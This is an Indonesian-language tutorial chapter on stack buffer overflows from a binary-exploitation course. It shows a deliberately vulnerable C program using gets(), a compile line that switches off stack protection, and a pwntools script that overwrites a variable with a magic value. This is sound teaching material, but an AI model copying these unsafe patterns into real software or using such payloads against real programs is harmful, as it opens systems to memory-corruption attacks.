---
title: 'Chapter 2: Stack Buffer Overflow'
description: 'Memahami kerentanan Buffer Overflow dan teknik eksploitasinya'
prev:
    text: 'Chapter 1: Dasar C'
    link: '/RE-Binex/Chapter1-Dasar_C'
next:
    text: 'Chapter 3: Ret2Win'
    link: '/RE-Binex/Chapter3_Ret2Win'
---

# Chapter 2: Stack Buffer Overflow Dasar

::: danger ⚠️ Legendary Vulnerability
Bab ini membahas kerentanan paling **legendaris** dalam sejarah keamanan software: **Buffer Overflow**.
:::

## 📝 Konsep Kerentanan

**Overflow** terjadi ketika program menerima input data lebih besar daripada kapasitas wadah (**buffer**) yang disediakan, sehingga data **"tumpah"** menimpa memori di sebelahnya.

```c
// Contoh vulnerable code
char buffer[16];  // Buffer hanya 16 bytes
gets(buffer);     // Input bisa unlimited! 💣
```

## 💫 Fungsi Berbahaya

::: warning ⚙️ Dangerous Functions
Dalam C, beberapa fungsi **tidak melakukan pengecekan batas** (boundary check):
:::

### 🔴 Level: Extremely Dangerous

```c
gets()  // Sangat berbahaya, TIDAK ADA BATAS sama sekali!
```

### 🟡 Level: Dangerous (Conditional)

```c
scanf("%s")   // Berhenti pada spasi, tapi tetap rentan overflow
strcpy()      // Menyalin string tanpa mengecek ukuran tujuan
strcat()      // Concatenation tanpa boundary check
sprintf()     // Format string tanpa batas
```

## 📊 Anatomi Serangan

Misalkan kita punya kode seperti ini:

```c
int target = 0;
char buffer[16];
gets(buffer);  // Vulnerability point!

if (target != 0) {
    printf("Variable overwritten!\n");
}
```

### Memory Layout:

```
┌────────────────────┐  ← Higher Address
│   target = 0       │
├────────────────────┤
│   padding/space    │  ← Memory alignment
├────────────────────┤
│   buffer[16]       │
│   ┌───────────────┐ │
│   │ A A A A A... │ │  ← Normal input
│   └───────────────┘ │
└────────────────────┘  ← Lower Address
```

### Overflow Attack:

Jika kita memasukkan **30 huruf 'A'**:

- 16 huruf pertama mengisi `buffer`
- Sisanya akan **meluap** dan menimpa variabel `target`

```
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (30 A's)
       │<--- 16 --->||<- overflow ->|
```

## 📎 Memory Alignment (Padding)

::: info 🧠 Pro Tip
Jarak antar variabel di Stack **tidak selalu** sama dengan ukuran array. Compiler sering menambahkan **Padding** (ruang kosong) agar alamat memori rapi (kelipatan 4 atau 8 byte).
:::

### Finding Exact Offset:

```bash
# Menggunakan GDB/Pwndbg
gdb ./vulnerable_program
(gdb) break main
(gdb) run
(gdb) p &buffer
(gdb) p &target
(gdb) p/d (&target - &buffer)  # Calculate distance
```

## 🔄 Little Endian

::: warning 🔢 Byte Order
Arsitektur x86/x64 menyimpan data byte secara **terbalik** (Little Endian).
:::

### Contoh:

| Format        | Nilai              |
| ------------- | ------------------ |
| **Hex**       | `0x12345678`       |
| **Di Memori** | `\x78\x56\x34\x12` |
| **Python**    | `p32(0x12345678)`  |

### Dalam Exploit:

```python
from pwn import *

# Correct way untuk x86/x64
address = 0x08048000
payload = p32(address)  # Otomatis convert ke little endian
```

## 🧪 Hands-on Example

### Vulnerable Code:

```c
// vulnerable.c
#include <stdio.h>
#include <string.h>

int target = 0;
char buffer[16];

int main() {
    printf("Enter input: ");
    gets(buffer);  // Vulnerable!

    printf("Buffer: %s\n", buffer);
    printf("Target: %d\n", target);

    if (target == 0xdeadbeef) {
        printf("🎉 SUCCESS! Target overwritten with magic value!\n");
    }

    return 0;
}
```

### Compile:

```bash
gcc -g -fno-stack-protector -z execstack vulnerable.c -o vulnerable
```

### Python Exploit:

```python
from pwn import *

# Calculate offset (example: 20 bytes)
offset = 20
magic = 0xdeadbeef

# Create payload
payload = b"A" * offset  # Fill buffer + padding
payload += p32(magic)    # Overwrite target

# Send to program
p = process('./vulnerable')
p.sendline(payload)
print(p.recvall().decode())
```

## 🎯 Checkpoint

::: details ✅ Apa yang sudah dipelajari?

- [x] Konsep Buffer Overflow dan penyebabnya
- [x] Fungsi-fungsi C yang berbahaya
- [x] Memory alignment dan padding
- [x] Little endian byte ordering
- [x] Cara menghitung offset untuk overflow
- [x] Membuat payload sederhana untuk overwrite variable
      :::

---

::: tip 📚 Next Level
Sekarang kita sudah bisa **mengubah variabel** dengan Buffer Overflow. Selanjutnya kita akan naik level ke **mengubah alur program** dengan teknik Ret2Win!

👉 [Lanjut ke Chapter 3: Return Address Overwrite](/RE-Binex/Chapter3_Ret2Win)
:::
